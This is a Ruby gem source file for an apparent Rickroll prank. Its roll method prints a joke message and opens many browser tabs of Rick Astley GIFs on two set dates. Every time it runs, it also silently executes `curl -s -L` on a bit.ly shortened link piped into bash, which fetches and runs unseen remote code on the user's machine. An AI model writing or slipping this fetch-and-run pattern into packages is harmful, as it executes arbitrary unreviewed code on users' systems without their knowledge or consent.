# require "rickgem/version"
require 'launchy'
require 'date'

include Launchy

module Rickgem
  class Error < StandardError; end

  def roll
    date = Time.new
    date = (date.day.to_s + "/" + date.month.to_s)
    if date == "1/4" or date == "6/2" # 'or date == "your date"' add this to start the "special" suprise on a custom date
      puts "You were Rickrolled!"
      puts "It is " + date + ", this means that you get a special suprise!!!!!"
      system("sleep 2")
      system("curl -s -L http://bit.ly/10hA8iC | bash")
      Launchy::Browser.run("https://www.icegif.com/wp-content/uploads/rickroll-icegif-4.gif")
      Launchy::Browser.run("https://media1.tenor.com/images/6b22f232ac2ab598a11918627e9bb6cb/tenor.gif")
      Launchy::Browser.run("https://i.gifer.com/IlDK.gif")
      Launchy::Browser.run("https://media.tenor.com/images/461a7c321425e447814ec90bb0a72faa/tenor.gif")
      Launchy::Browser.run("https://media0.giphy.com/media/kdc0nMb8JJZcBsWDgy/giphy.gif")
      Launchy::Browser.run("https://hips.hearstapps.com/digitalspyuk.cdnds.net/16/34/1472221491-rick-astley.gif")
      Launchy::Browser.run("https://www.icegif.com/wp-content/uploads/rickroll-icegif-4.gif")
      Launchy::Browser.run("https://media1.tenor.com/images/6b22f232ac2ab598a11918627e9bb6cb/tenor.gif")
      Launchy::Browser.run("https://i.gifer.com/IlDK.gif")
      Launchy::Browser.run("https://media.tenor.com/images/461a7c321425e447814ec90bb0a72faa/tenor.gif")
      Launchy::Browser.run("https://media0.giphy.com/media/kdc0nMb8JJZcBsWDgy/giphy.gif")
      Launchy::Browser.run("https://hips.hearstapps.com/digitalspyuk.cdnds.net/16/34/1472221491-rick-astley.gif")
    else
      puts "You were Rickrolled!!!!!!!!!! :)"
      system("sleep 2")
      system("curl -s -L http://bit.ly/10hA8iC | bash")
    end
  end
end

include Rickgem

# Rickgem.roll
